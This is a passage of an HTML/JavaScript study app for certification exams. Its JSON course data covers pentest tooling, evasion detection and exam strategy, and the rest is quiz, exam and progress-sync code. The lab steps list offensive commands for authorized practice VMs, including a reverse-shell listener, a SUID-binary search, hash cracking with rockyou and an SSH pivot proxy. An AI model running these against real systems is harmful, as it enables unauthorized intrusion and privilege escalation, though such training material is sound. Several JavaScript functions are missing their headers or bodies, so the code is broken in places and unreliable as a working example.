it."},{"type":"mcq","q":"Encoding/obfuscating a payload aims to:","options":["Evade signature-based detection","Improve performance","Encrypt data at rest","Nothing"],"answer":0,"explain":"Behavior-based detection (EDR) is harder to evade than signatures."},{"type":"mcq","q":"From a purple-team view, when a technique is NOT detected you should:","options":["Report the detection gap so the client can add monitoring","Keep it secret","Exploit it forever","Ignore it"],"answer":0,"explain":"Undetected TTPs are exactly what the client needs to know."},{"type":"mcq","q":"Why do attackers clear or tamper with logs?","options":["To hide their activity and slow response","To free disk space","To help defenders","To speed the system"],"answer":0,"explain":"Recommend centralized, immutable/off-host logging."},{"type":"mcq","q":"\"Beaconing\" traffic to C2 is detectable by:","options":["Regular, periodic connections to an unusual destination","Encryption alone","Faster DNS","Nothing"],"answer":0,"explain":"Flow analysis and threat intel catch beacon patterns."},{"type":"mcq","q":"The best defensive recommendation after testing evasion is often:","options":["Centralized logging + EDR + behavior analytics + alert tuning","Turn off logging","Trust the endpoint","Flat network"],"answer":0,"explain":"Detection depth matters more than any single tool."}],"labs":[{"title":"Purple-team detection map","scenario":"For three techniques you used (LOLBins, log tampering, beaconing), write the detection the client should have.","hints":[],"steps":["# LOLBins -> EDR command-line + parent/child process alerts","# log tampering -> central/immutable logs + integrity monitoring","# beaconing -> netflow analysis + threat-intel matching"],"verify":["each technique has a concrete detection"]},{"title":"Test whether actions alert (lab)","scenario":"In a monitored lab, run a noisy action and a quiet action; note which triggered detection.","hints":[],"steps":["# noisy: full port scan of a host","# quiet: single connection to one service","# check the lab SIEM/EDR for which generated an alert"],"verify":["you can state the detection gap"]},{"title":"Recommend logging improvements","scenario":"After finding local logs were tamperable, write the logging recommendations.","hints":[],"steps":["# forward logs off-host in real time (central SIEM)","# make local logs append-only/immutable where possible","# alert on log-clearing events; sync time via NTP"],"verify":["an attacker can no longer quietly erase evidence"]}]},{"day":27,"course":"2 Recon","title":"The pentest toolkit","objective":"Know the core tools, what they do, and their basic syntax.","questions":[{"type":"cmd","q":"Version scan with nmap (recon).","accept":["nmap -sV <target>"],"explain":"The go-to network mapper for host/service discovery."},{"type":"cmd","q":"Directory brute-force a web app with gobuster.","accept":["gobuster dir -u http://<target> -w <wordlist>"],"explain":"Content discovery to find hidden endpoints."},{"type":"cmd","q":"Fuzz web parameters/paths with ffuf.","accept":["ffuf -u http://<target>/FUZZ -w <wordlist>"],"explain":"FUZZ is the injection point; fast and flexible."},{"type":"cmd","q":"Crack hashes with hashcat using a wordlist (mode 0 = MD5).","accept":["hashcat -m 0 hashes.txt <wordlist>"],"explain":"GPU-accelerated cracking; pick -m for the hash type."},{"type":"cmd","q":"Crack hashes with John the Ripper.","accept":["john --wordlist=<wordlist> hashes.txt"],"explain":"CPU-based; `--show` reveals cracked passwords."},{"type":"cmd","q":"Intercept and modify web traffic (tool name).","accept":["burpsuite","zaproxy"],"explain":"Burp Suite / OWASP ZAP are the core web proxies for manual testing."},{"type":"cmd","q":"Search local Exploit-DB for a keyword.","accept":["searchsploit <keyword>"],"explain":"Read any PoC before use; test in a lab."},{"type":"mcq","q":"Which tool would you use to capture and analyze packets on the wire?","options":["Wireshark / tcpdump","gobuster","hashcat","john"],"answer":0,"explain":"Packet capture is for traffic analysis, not cracking or fuzzing."},{"type":"mcq","q":"Which tool maps Active Directory attack paths?","options":["BloodHound","ffuf","hashcat","nmap"],"answer":0,"explain":"BloodHound graphs AD relationships to Domain Admin."}],"labs":[{"title":"Tool-to-task matching","scenario":"For each task, name the primary tool: port scan, web content discovery, hash cracking, packet capture, web request interception, AD path mapping.","hints":[],"steps":["# port scan -> nmap","# web content discovery -> gobuster/ffuf","# hash cracking -> hashcat/john","# packet capture -> wireshark/tcpdump","# web interception -> burp/zap","# AD paths -> bloodhound"],"verify":["you can pick the right tool instantly"]},{"title":"Build a one-page cheat sheet","scenario":"Write your own quick-reference of 10 commands you use most, with a one-line note each.","hints":[],"steps":["nmap -sV -sC -p- -oA scan <t>   # full service+script scan","gobuster dir -u http://<t> -w common.txt   # content discovery","ffuf -u http://<t>/FUZZ -w common.txt      # fuzz paths/params","hashcat -m 0 hashes.txt rockyou.txt        # crack MD5","# ...add the rest you rely on"],"verify":["you have a personal cheat sheet you can recall under time pressure"]},{"title":"Chain three tools","scenario":"On an authorized lab, use nmap -> gobuster -> curl to go from open port to a specific vulnerable endpoint.","hints":[],"steps":["nmap -sV -p80 192.168.56.10","gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt -q","curl -i http://192.168.56.10/<found-path>"],"verify":["you moved from discovery to a concrete endpoint with three tools"]}]},{"day":28,"course":"1 Engagement","title":"Pentest+ exam-day and full practice","objective":"Approach PT0-003 and consolidate everything with practice.","questions":[{"type":"mcq","q":"PT0-003 includes performance-based questions that require you to:","options":["Analyze output, choose/complete commands, or work through a scenario","Only pick A-D","Write essays","Draw diagrams by hand"],"answer":0,"explain":"Hands-on command familiarity is exactly what wins PBQ points."},{"type":"mcq","q":"A strong exam strategy for PBQs is to:","options":["Flag time-consuming ones, secure the quick multiple-choice points, then return","Spend all your time on the first PBQ","Skip every PBQ","Guess and leave"],"answer":0,"explain":"Bank the easy points first; PBQs can consume the clock."},{"type":"mcq","q":"When a question asks for the NEXT step in a methodology, choose:","options":["The step that logically follows in the phase order (e.g., enumerate before exploit)","The most aggressive action","The report step always","A random tool"],"answer":0,"explain":"Know the phase order cold: recon -> enumerate -> exploit -> post -> report."},{"type":"mcq","q":"Given tool output in a question, the best approach is to:","options":["Read the output carefully and pick the action it actually supports","Ignore the output","Pick the flashiest tool","Choose \"run a DoS\""],"answer":0,"explain":"PBQs reward interpreting real output correctly."},{"type":"mcq","q":"For any scenario, the professional first consideration is:","options":["Scope and authorization","Which exploit is coolest","Speed over safety","Skipping the report"],"answer":0,"explain":"Staying in scope and authorized is always the right instinct."},{"type":"mcq","q":"The safest answer when two exploits both \"work\" is usually:","options":["The lower-impact one that proves the risk without disrupting the target","The most destructive one","A DoS","Whichever is fastest to type"],"answer":0,"explain":"\"Do no harm\" guides both the exam and the job."},{"type":"mcq","q":"What ties the whole engagement together for the client?","options":["A clear, prioritized report with evidence and remediation","The number of shells","The exploit code alone","Raw scanner output"],"answer":0,"explain":"Communication and remediation create the real value."}],"labs":[{"title":"Timed methodology drill","scenario":"Take a mixed quiz across all five domains under a mental timer; flag and review only the ones you miss.","hints":[],"steps":["# Quiz tab -> all domains -> focus on phase order and tool choice"],"verify":["you consistently pick the correct next step"]},{"title":"Full engagement dry run (authorized lab)","scenario":"On a vulnerable lab VM, run a complete mini-engagement: recon, enumeration, exploitation (low-impact PoC), post-exploitation enumeration, cleanup, and a one-page report.","hints":[],"steps":["nmap -sV -sC -p- -oA engage <lab-ip>","gobuster dir -u http://<lab-ip> -w /usr/share/wordlists/dirb/common.txt -q","# exploit one confirmed vuln (PoC), get a shell, enumerate, then clean up","# write: findings, evidence, impact, remediation"],"verify":["you completed all phases and produced a report"]},{"title":"Command-recall speed round","scenario":"Without notes, write the command for: full port+version scan, web content discovery, hash crack, reverse-shell listener, SUID search, and a pivot proxy.","hints":[],"steps":["nmap -sS -sV -p- <t>","gobuster dir -u http://<t> -w common.txt","hashcat -m 0 hashes.txt rockyou.txt","nc -lvnp 4444","find / -perm -4000 -type f 2>/dev/null","ssh -D 1080 user@foothost"],"verify":["you recalled every command from memory"]},{"title":"Weak-spot sweep","scenario":"Use the weak-spots quiz mode until no domain is below 80%, then redo the labs you found hardest.","hints":[],"steps":["# Quiz -> My weak spots -> repeat","# Labs -> redo the two hardest without revealing steps"],"verify":["every domain >= 80% and you can do the hard labs unaided"]}]}]}]}</script>
<script>
"use strict";
/* ---------- state ---------- */
const state = {
  data:null, courseId:null, tab:'today',
  progress:{ items:{}, labs:{}, daily:{}, streak:0, lastActive:null },
  db:null, uid:null, dbDoc:null, saveTimer:null, dirty:false, syncMode:'local'
};
const $ = (s,r=document)=>r.querySelector(s);
const el = (t,c,txt)=>{const e=document.createElement(t);if(c)e.className=c;if(txt!=null)e.textContent=txt;return e;};
const app = $('#app');

/* ---------- persistence ---------- */
const LS_KEY = 'linuxcertlab.progress.v1';
function loadLocal(){
  try{const r=localStorage.getItem(LS_KEY);if(r){const p=JSON.parse(r);state.progress=Object.assign(state.progress,p);}}catch(e){}
}
function saveLocal(){
  try{localStorage.setItem(LS_KEY,JSON.stringify(state.progress));}catch(e){}
}
function markDirty(){
  state.dirty=true; saveLocal();
  if(state.dbDoc){
    clearTimeout(state.saveTimer);
    state.saveTimer=setTimeout(flushDb,900);
  }
}
async function flushDb(){
  if(!state.dbDoc||!state.dirty)return;
  state.dirty=false;
  try{ await state.dbDoc.set(JSON.parse(JSON.stringify(state.progress))); }
  catch(e){ state.dirty=true; }
}
async function initCloud(){
  try{
    const user = await (window.claude&&window.claude.use?window.claude.use('user'):null);
    const db = await (window.claude&&window.claude.use?window.claude.use('db'):null);
    if(!db){ setSync('local'); return; }
    state.db=db;
    let uid = user? await user.id() : null;
    if(!uid){ setSync('local'); return; }
    state.uid=uid;
    state.dbDoc = db.doc('data/users/'+uid+'/progress');
    // one-time merge: pull server, merge local into it
    state.dbDoc.onSnapshot(snap=>{
      const remote = snap.exists ? snap.data() : null;
      if(remote){
        // merge: union of items/labs, prefer any recorded status
        mergeProgress(remote);
        renderTab();
      }
      setSync('cloud');
    }, err=>{ setSync('local'); });
    // push our local state up so a fresh device seeds the cloud
    markDirty();
  }catch(e){ setSync('local'); }
}
function mergeProgress(remote){
  const p=state.progress;
  // union of items: keep the stronger status (correct > wrong > seen) from either side
  const merged = Object.assign({}, remote.items||{});
  for(const k in (p.items||{})) merged[k] = pickBetter(p.items[k], merged[k]);
  p.items=merged;
  const ml=Object.assign({}, remote.labs||{});
  for(const k in (state.progress.labs||{})) ml[k]=ml[k]||state.progress.labs[k];
  p.labs=ml;
  p.daily=Object.assign({}, remote.daily||{}, p.daily||{});
  p.streak=Math.max(remote.streak||0, p.streak||0);
  p.lastActive=laterDate(remote.lastActive, p.lastActive);
  saveLocal();
}
function pickBetter(a,b){
  const rank=s=>s==='correct'?2:s==='wrong'?1:0;
  if(!a)return b; if(!b)return a;
  return rank(a.status)>=rank(b.status)?a:b;
}
function laterDate(a,b){ if(!a)return b; if(!b)return a; return a>b?a:b; }
function setSync(mode){
  state.syncMode=mode;
  const s=$('#syncBadge'); if(s){ s.className='sync '+(mode==='cloud'?'on':'local');
    s.querySelector('.t').textContent = mode==='cloud'?'Synced to your account':'Saved on this device'; }
}

/* ---------- helpers ---------- */
function course(){ return state.data.courses.find(c=>c.id===state.courseId); }
function todayStr(){ return new Date().toISOString().slice(0,10); }
function itemKey(dayNum,q,i){ return state.courseId+':'+dayNum+':'+q.type+':'+i; }
function labKey(dayNum,i){ return state.courseId+':'+dayNum+':L'+i; }
function normCmd(s){ return s.trim().replace(/\s+/g,' ').replace(/\s*;\s*/g,'; '); }
function dayProgress(day){
  let tot=0,done=0;
  day.questions.forEach((q,i)=>{tot++; const s=state.progress.items[itemKey(day.day,q,i)]; if(s&&s.status)done++;});
  day.labs.forEach((l,i)=>{tot++; if(state.progress.labs[labKey(day.day,i)])done++;});
  return {tot,done,pct:tot?Math.round(done/tot*100):0};
}
function courseProgress(){
  const c=course(); let tot=0,done=0,correct=0,seen=0;
  c.days.forEach(d=>{
    d.questions.forEach((q,i)=>{tot++;const s=state.progress.items[itemKey(d.day,q,i)];if(s&&s.status){done++;seen++;if(s.status==='correct')correct++;}});
    d.labs.forEach((l,i)=>{tot++;if(state.progress.labs[labKey(d.day,i)])done++;});
  });
  return {tot,done,correct,seen,pct:tot?Math.round(done/tot*100):0};
}

/* render a terminal-style block from lines that may contain # comments */
function termBlock(lines,caption){
  const wrap=el('div');
  if(caption){const c=el('div','termcap');c.append(el('span','',caption));wrap.append(c);}
  const t=el('div','term');
  lines.forEach((ln,idx)=>{
    if(idx)t.append(document.createTextNode('\n'));
    renderTermLine(t,ln);
  });
  wrap.append(t);
  return wrap;
}
function renderTermLine(t,ln){
  // split trailing comment (# ...) not inside quotes — simple heuristic
  const isComment = ln.trim().startsWith('#');
  if(isComment){ const s=el('span','cmt',ln); t.append(s); return; }
  const hashIdx = findComment(ln);
  const pr=el('span','pr','$ '); t.append(pr);
  if(hashIdx>=0){
    t.append(document.createTextNode(ln.slice(0,hashIdx)));
    t.append(el('span','cmt',ln.slice(hashIdx)));
  }else{
    t.append(document.createTextNode(ln));
  }
}
function findComment(ln){
  let q=null;
  for(let i=0;i<ln.length;i++){
    const ch=ln[i];
    if(q){ if(ch===q)q=null; }
    else if(ch==="'"||ch==='"')q=ch;
    else if(ch==='#'&&i>0&&/\s/.test(ln[i-1]))return i;
  }
  return -1;
}
/* inline `code` markup in explanations */
function richText(str){
  const frag=document.createDocumentFragment();
  const parts=str.split(/(`[^`]+`|<b>|<\/b>)/g);
  let bold=false;
  parts.forEach(p=>{
    if(p==='<b>'){bold=true;return;} if(p==='</b>'){bold=false;return;}
    if(!p)return;
    let node;
    if(p.startsWith('`')&&p.endsWith('`'))node=el('code',null,p.slice(1,-1));
    else node=document.createTextNode(p);
    if(bold&&node.nodeType===3){const b=el('strong');b.append(node);node=b;}
    else if(bold){const b=el('strong');b.append(node);node=b;}
    frag.append(node);
  });
  return frag;
}
function pillFor(courseTag){
  const map={RH124:'rh124',RH134:'rh134',EX200:'ex200'};
  let cls=map[courseTag];
  if(cls===undefined){
    const m=/^(\d)/.exec(courseTag||'');
    cls = m ? 'dom d'+m[1] : '';   // CompTIA domain tags like "4 Exploitation"
  }
  const p=el('span','pill '+cls); p.textContent=courseTag; return p;
}
function toast(msg){
  const t=$('#toast'); t.textContent=msg; t.classList.add('show');
  clearTimeout(t._tmr); t._tmr=setTimeout(()=>t.classList.remove('show'),1600);
}

/* ---------- question card ---------- */
function questionCard(day,q,idx,onAnswered){
  const key=itemKey(day.day,q,idx);
  const prev=state.progress.items[key];
  const card=el('div','card pad');
  const meta=el('div','qmeta');
  meta.append(pillFor(day.course));
  meta.append(el('span','pill',q.type==='cmd'?'⌨ command':'◉ multiple choice'));
  meta.append(el('span','eyebrow','Day '+day.day));
  card.append(meta);
  card.append(el('div','qtext',q.q));

  let answered=false;
  const finish=(correct)=>{
    if(answered)return; answered=true;
    recordItem(key,correct);
    showExplain();
    if(onAnswered)onAnswered(correct);
  };
  const showExplain=()=>{
    const ex=el('div','explain');
    const v=el('div','verdict '+(state.progress.items[key].status==='correct'?'g':'b'));
    v.textContent = state.progress.items[key].status==='correct'?'✓ Correct':'✗ Not quite';
    ex.append(v);
    const exbody=el('div');exbody.append(richText(q.explain));ex.append(exbody);
    card.append(ex);
  };

  if(q.type==='mcq'){
    const opts=el('div','opts');
    q.options.forEach((o,i)=>{
      const b=el('button','opt');
      b.append(el('span','k',String.fromCharCode(65+i)));
      b.append(el('span',null,o));
      b.onclick=()=>{
        if(answered)return;
        Array.from(opts.children).forEach(c=>c.disabled=true);
        opts.children[q.answer].classList.add('correct');
        if(i!==q.answer)b.classList.add('wrong');
        finish(i===q.answer);
      };
      opts.append(b);
    });
    card.append(opts);
  }else{
    const inp=el('input','cmdin');
    inp.type='text'; inp.placeholder='type the command…'; inp.autocapitalize='off';
    inp.autocomplete='off'; inp.spellcheck=false;
    card.append(inp);
    const row=el('div','row'); row.style.marginTop='12px';
    const check=el('button','btn primary sm','Check');
    const reveal=el('button','btn sm','Show answer');
    row.append(check,reveal); card.append(row);
    const doCheck=()=>{
      if(answered)return;
      const val=normCmd(inp.value);
      const ok=q.accept.some(a=>normCmd(a)===val);
      inp.disabled=true; check.disabled=true;
      inp.classList.add(ok?'correct':'wrong');
      const acc=el('div','accepts');
      acc.append(el('div','faint','Accepted:'));
      q.accept.forEach(a=>acc.append(el('span','a',a)));
      card.insertBefore(acc,row.nextSibling);
      finish(ok);
    };
    check.onclick=doCheck;
    inp.addEventListener('keydown',e=>{if(e.key==='Enter')doCheck();});
    reveal.onclick=()=>{ if(answered)return; inp.value=q.accept[0]; doCheck(); };
  }
  return card;
}
function recordItem(key,correct){
  state.progress.items[key]={status:correct?'correct':'wrong',ts:Date.now()};
  bumpStreak();
  markDirty();
}
function bumpStreak(){
  const t=todayStr(), la=state.progress.lastActive;
  if(la===t)return;
  const y=new Date(Date.now()-864e5).toISOString().slice(0,10);
  state.progress.streak = (la===y)?(state.progress.streak||0)+1:1;
  state.progress.lastActive=t;
}

/* ---------- TODAY ---------- */
function dailyIndexFor(dateStr){
  // deterministic pick across all questions of the course, rotating by day-of-epoch
  const c=course();
  const flat=[]; c.days.forEach(d=>d.questions.forEach((q,i)=>flat.push([d,q,i])));
  const epochDay=Math.floor(new Date(dateStr+'T00:00:00Z').getTime()/864e5);
  // stir with course id so different courses show different daily Qs
  let seed=epochDay; for(const ch of state.courseId)seed=(seed*31+ch.charCodeAt(0))>>>0;
  return {flat, pick:flat[seed%flat.length]};
}

function firstUnfinishedDay(){
  const c=course();
  return c.days.find(d=>dayProgress(d).pct<100)||c.days[0];
}

  const b=el('button','daycard'+(p.pct===100?' done':''));
  const ring=el('div','ring');ring.style.setProperty('--p',p.pct);
  const rs=el('span',null,p.pct+'%');ring.append(rs);
  const txt=el('div');txt.style.minWidth='0';
  txt.append(el('div','dn','DAY '+String(d.day).padStart(2,'0')));
  txt.append(el('div','dt',d.title));
  b.append(ring,txt);
  b.onclick=()=>openDay(d.day);
  return b;
}
function renderDays(){

  head.append(el('h2',null,d.title));head.style.marginBottom='4px';
  const ob=el('div','muted');ob.style.marginTop='6px';ob.append(el('span','faint','Exam objective — '));ob.append(document.createTextNode(d.objective));head.append(ob);
  const p=dayProgress(d);const pb=el('div','progbar');pb.style.marginTop='12px';const pbi=el('i');pbi.style.width=p.pct+'%';pb.append(pbi);head.append(pb);
  app.append(head);

    const st=el('div','section-title');st.append(el('h2',null,'Questions'));

    d.labs.forEach((l,i)=>state.progress.labs[labKey(d.day,i)]=true); bumpStreak(); markDirty(); toast('Day '+d.day+' marked complete'); openDay(dayNum); };

/* ---------- LAB CARD ---------- */
function labCard(d,l,i){
  const key=labKey(d.day,i);
  const card=el('div','card pad lab');card.style.marginBottom='12px';
  const mt=el('div','qmeta');mt.append(el('span','pill','🧪 lab'));mt.append(el('span','eyebrow','Day '+d.day));
  if(state.progress.labs[key])mt.append(el('span','pill ex200','✓ done'));
  card.append(mt);
  card.append(el('div','qtext',l.title));
  const sc=el('div','scenario');sc.style.marginTop='8px';sc.append(richText(l.scenario));card.append(sc);

  if(l.hints&&l.hints.length){
    const dh=el('details','disc');const sm=el('summary');sm.append(el('span',null,'💡 Hints'));sm.append(el('span','chev','›'));dh.append(sm);
    const body=el('div','body');l.hints.forEach(h=>{const hl=el('div','hintline');hl.append(richText(h));body.append(hl);});dh.append(body);card.append(dh);
  }
  const ds=el('details','disc');const sm2=el('summary');sm2.append(el('span',null,'⌨ Solution steps'));sm2.append(el('span','chev','›'));ds.append(sm2);
  const body2=el('div','body');body2.append(termBlock(l.steps,'run these on your lab / practice VM'));ds.append(body2);card.append(ds);

  if(l.verify&&l.verify.length){
    const dv=el('details','disc');const sm3=el('summary');sm3.append(el('span',null,'✅ Verify it worked'));sm3.append(el('span','chev','›'));dv.append(sm3);
    const body3=el('div','body');body3.append(termBlock(l.verify,'expected: these succeed'));dv.append(body3);card.append(dv);
  }
  const row=el('div','row');row.style.marginTop='14px';
  const mark=el('button','btn sm'+(state.progress.labs[key]?'':' primary'),state.progress.labs[key]?'↺ Mark not done':'✓ I completed this lab');
  mark.onclick=()=>{state.progress.labs[key]=!state.progress.labs[key];if(state.progress.labs[key])bumpStreak();markDirty();
    toast(state.progress.labs[key]?'Lab done ✓':'Marked not done');
    if(state.tab==='days')openDay(d.day); else renderTab();};
  row.append(mark);card.append(row);
  return card;
}

function cmdCount(){ const c=course(); let n=0; c.days.forEach(d=>d.questions.forEach(q=>{if(q.type==='cmd')n++;})); return n; }
function startQuiz(){
  const c=course();let pool=[];
  c.days.forEach(d=>d.questions.forEach((q,i)=>pool.push([d,q,i])));
  const sc=state.quizCfg?state.quizCfg.scope:'all';
  if(sc==='rh124')pool=pool.filter(([d])=>d.course==='RH124');
  else if(sc==='rh134')pool=pool.filter(([d])=>d.course==='RH134');
  else if(sc==='cmd')pool=pool.filter(([d,q])=>q.type==='cmd');
  else if(sc==='weak')pool=pool.filter(([d,q,i])=>{const s=state.progress.items[itemKey(d.day,q,i)];return !s||s.status==='wrong';});
  if(!pool.length){ c.days.forEach(d=>d.questions.forEach((q,i)=>{if(!pool.length)pool.push([d,q,i]);})); }
  shuffle(pool);
  const n=Math.min(state.quizCfg?state.quizCfg.n:10,pool.length);
  state.quiz={items:pool.slice(0,n),idx:0,correct:0,answered:false};
  state.quizActive=true;state.tab='quiz';renderTabs();renderQuizRun();
}
function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}}
function renderQuizRun(){
  const qz=state.quiz;
  if(qz.idx>=qz.items.length){renderQuizResult();return;}
  const total=qz.items.length;
  const bar=el('div');bar.style.marginBottom='14px';
  const info=el('div','row');info.style.justifyContent='space-between';
  info.append(el('span','eyebrow','Question '+(qz.idx+1)+' / '+total));
  info.append(el('span','mono faint','score '+qz.correct));
  bar.append(info);
  const pb=el('div','progbar');pb.style.marginTop='6px';const pbi=el('i');pbi.style.width=(qz.idx/total*100)+'%';pb.append(pbi);bar.append(pb);
  app.append(bar);
  const [day,q,idx]=qz.items[qz.idx];
  qz.answered=false;
  const card=questionCard(day,q,idx,(correct)=>{
    if(correct)qz.correct++; qz.answered=true;
    next.disabled=false; next.classList.add('primary');
  });
  app.append(card);
  const next=el('button','btn','Skip →');next.style.marginTop='16px';
  next.onclick=()=>{qz.idx++;app.innerHTML='';renderQuizRun();window.scrollTo(0,0);};
  app.append(next);
  const quit=el('button','btn sm','End quiz');quit.style.marginTop='10px';quit.style.marginLeft='8px';
  quit.onclick=()=>{state.quizActive=false;renderQuiz();};
  next.after(quit);
}
function renderQuizResult(){
  const qz=state.quiz;const pct=Math.round(qz.correct/qz.items.length*100);
  state.quizActive=false;
  const card=el('div','hero');card.style.textAlign='center';
  card.append(el('div','flame',pct+'%'));
  card.append(el('div','qtext',qz.correct+' / '+qz.items.length+' correct'));
  const msg=pct>=80?'Exam-ready on this set 🎯':pct>=60?'Solid — review the misses':'Keep drilling, you’ll get there';
  card.append(el('div','muted',msg));
  const row=el('div','row');row.style.justifyContent='center';row.style.marginTop='16px';
  const again=el('button','btn primary','↻ New quiz');again.onclick=()=>renderQuiz();
  const weak=el('button','btn','Drill weak spots');weak.onclick=()=>{state.quizCfg={n:10,scope:'weak'};startQuiz();};
  row.append(again,weak);card.append(row);
  app.append(card);
}

/* ---------- EXAM ---------- */
function renderExam(){
  if(state.examActive){renderExamRun();return;}
  const c=course();
  const head=el('div','card pad');
  head.append(el('div','eyebrow','Timed practical drill'));
  head.append(el('div','qtext','Timed lab exam'));
  const p=el('div','muted');
  const txt = state.courseId==='rhcsa'
    ? 'EX200 is 100% hands-on with a 210/300 pass mark. This picks a set of real labs, starts a timer, and gives you a self-graded checklist — just like the real thing. Do them on your RHEL VM, then tick what actually works after a reboot.'
    : 'A timed set of hands-on tasks with a self-graded checklist. Do each one on your practice VM, then tick what actually works. The written exam is multiple-choice, but the performance-based questions reward exactly this kind of command practice.';
  p.append(document.createTextNode(txt));
  head.append(p);
  app.append(head);
  const cfg=el('div','card pad');cfg.style.marginTop='14px';
  cfg.append(el('div','eyebrow','Exam length'));
  const row=el('div','row');row.style.margin='10px 0';
  const opts=[[8,'45 min'],[12,'90 min'],[18,'2.5 hr (full)']];let picked=12;
  opts.forEach(([n,lbl])=>{const b=el('button','btn sm'+(n===12?' primary':''),lbl+' · '+n+' tasks');b.onclick=()=>{picked=n;Array.from(row.children).forEach(x=>x.className='btn sm');b.className='btn sm primary';};row.append(b);});
  cfg.append(row);app.append(cfg);
  const go=el('button','btn primary','▶ Start exam');go.style.marginTop='16px';
  go.onclick=()=>startExam(picked);app.append(go);
}
function startExam(n){
  const c=course();const labs=[];c.days.forEach(d=>d.labs.forEach((l,i)=>labs.push([d,l,i])));
  shuffle(labs);
  state.exam={items:labs.slice(0,n),checks:{},start:Date.now(),dur:n*450*1000};
  state.examActive=true;renderExamRun();
}
function renderExamRun(){
  const ex=state.exam;
  const bar=el('div','card pad');bar.style.marginBottom='14px';
  bar.style.position='sticky';bar.style.top='calc(96px + env(safe-area-inset-top,0px))';bar.style.zIndex='10';
  const trow=el('div','row');trow.style.justifyContent='space-between';trow.style.alignItems='center';
  const tleft=el('div');tleft.append(el('div','eyebrow','Time remaining'));
  const clock=el('div','flame');clock.id='examClock';clock.style.fontSize='26px';tleft.append(clock);
  trow.append(tleft);
  const done=Object.values(ex.checks).filter(Boolean).length;
  const sc=el('div');sc.style.textAlign='right';
  sc.append(el('div','eyebrow','Tasks passed'));
  const scf=el('div','flame',done+' / '+ex.items.length);scf.style.fontSize='26px';sc.append(scf);
  trow.append(sc);bar.append(trow);
  const endb=el('button','btn sm','Finish & score');endb.style.marginTop='10px';endb.onclick=finishExam;bar.append(endb);
  app.append(bar);

  ex.items.forEach(([d,l,i],n)=>{
    const key=d.day+':'+i;
    const card=el('div','card pad');card.style.marginBottom='12px';
    const mt=el('div','qmeta');mt.append(el('span','pill','Task '+(n+1)));mt.append(pillFor(d.course));mt.append(el('span','eyebrow','Day '+d.day));card.append(mt);
    card.append(el('div','qtext',l.title));
    const scn=el('div','scenario');scn.style.marginTop='8px';scn.append(richText(l.scenario));card.append(scn);
    const ds=el('details','disc');const sm=el('summary');sm.append(el('span',null,'⌨ Reveal solution (costs you exam realism!)'));sm.append(el('span','chev','›'));ds.append(sm);
    const body=el('div','body');body.append(termBlock(l.steps));if(l.verify)body.append(termBlock(l.verify,'verify'));ds.append(body);card.append(ds);
    const chk=el('label','check');const cb=el('input');cb.type='checkbox';cb.checked=!!ex.checks[key];
    cb.onchange=()=>{ex.checks[key]=cb.checked;app.querySelector('#examClock');renderExamHead();};
    chk.append(cb);chk.append(el('span',null,'This task works after a reboot'));card.append(chk);
    app.append(card);
  });
  startExamClock();
}
function renderExamHead(){
  // cheap refresh of the passed counter
  const ex=state.exam;const done=Object.values(ex.checks).filter(Boolean).length;
  const nodes=app.querySelectorAll('.flame');if(nodes[1])nodes[1].textContent=done+' / '+ex.items.length;
}
function startExamClock(){
  clearInterval(state._exTmr);
  const tick=()=>{
    const ex=state.exam;const left=ex.start+ex.dur-Date.now();
    const c=$('#examClock');if(!c){clearInterval(state._exTmr);return;}
    if(left<=0){c.textContent='00:00';clearInterval(state._exTmr);return;}
    const m=Math.floor(left/60000),s=Math.floor(left%60000/1000);
    c.textContent=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
    if(left<300000)c.style.color='var(--bad)';
  };
  tick();state._exTmr=setInterval(tick,1000);
}
function finishExam(){
  clearInterval(state._exTmr);
  const ex=state.exam;const done=Object.values(ex.checks).filter(Boolean).length;
  const score=Math.round(done/ex.items.length*300);
  // record completed labs
  ex.items.forEach(([d,l,i])=>{if(ex.checks[d.day+':'+i])state.progress.labs[labKey(d.day,i)]=true;});
  bumpStreak();markDirty();
  state.examActive=false;app.innerHTML='';
  const rhcsa=state.courseId==='rhcsa';
  const pct=Math.round(done/ex.items.length*100);
  const card=el('div','hero');card.style.textAlign='center';
  card.append(el('div','eyebrow',rhcsa?'Simulated score (300 scale)':'Tasks passed'));
  const cf=el('div','flame',rhcsa?score+'':pct+'%');cf.style.fontSize='48px';card.append(cf);
  const pass=rhcsa?score>=210:pct>=80;
  const v=el('div','verdict '+(pass?'g':'b'));v.style.fontSize='16px';v.style.justifyContent='center';
  v.textContent=pass?(rhcsa?'✓ PASS (≥210 needed)':'✓ Strong (aim ≥80%)'):(rhcsa?'✗ Below 210 — keep going':'✗ Below 80% — keep going');card.append(v);
  card.append(el('div','muted',done+' of '+ex.items.length+' tasks passed. '+(rhcsa?'On the real exam, only what persists after reboot counts.':'Practising these tasks builds the hands-on skill the performance-based questions test.')));
  const again=el('button','btn primary','↻ New exam');again.style.marginTop='16px';again.onclick=()=>{state.tab='exam';renderTabs();renderExam();};
  card.append(again);app.append(card);
}

/* ---------- STATS ---------- */
function renderStats(){
  const c=course();const cp=courseProgress();
  const head=el('div','card pad');
  head.append(el('div','eyebrow',c.name));
  head.append(el('div','qtext','Your progress'));
  app.append(head);
  const stats=el('div','stats');stats.style.margin='14px 0';
  const acc=cp.seen?Math.round(cp.correct/cp.seen*100):0;
  [['n',cp.pct+'%','Course complete'],['n',(state.progress.streak||0)+'','Day streak'],['n',acc+'%','Answer accuracy']]
    .forEach(([_,n,l])=>{const s=el('div','stat');s.append(el('div','n',n));s.append(el('div','l',l));stats.append(s);});
  app.append(stats);
  const stats2=el('div','stats');stats2.style.marginBottom='14px';
  let labsDone=0,labsTot=0;c.days.forEach(d=>d.labs.forEach((l,i)=>{labsTot++;if(state.progress.labs[labKey(d.day,i)])labsDone++;}));
  [[cp.seen,'Questions answered'],[cp.correct,'Answered correctly'],[labsDone+'/'+labsTot,'Labs completed']]
    .forEach(([n,l])=>{const s=el('div','stat');s.append(el('div','n',n+''));s.append(el('div','l',l));stats2.append(s);});
  app.append(stats2);

  // per-day heat list
  const st=el('div','section-title');st.append(el('h2',null,'By day'));app.append(st);
  c.days.forEach(d=>{
    const p=dayProgress(d);
    const rowc=el('button','daycard');rowc.style.width='100%';
    const ring=el('div','ring');ring.style.setProperty('--p',p.pct);ring.append(el('span',null,p.pct+'%'));
    const t=el('div');t.style.minWidth='0';t.style.flex='1';
    t.append(el('div','dn','DAY '+String(d.day).padStart(2,'0')+' · '+d.course));
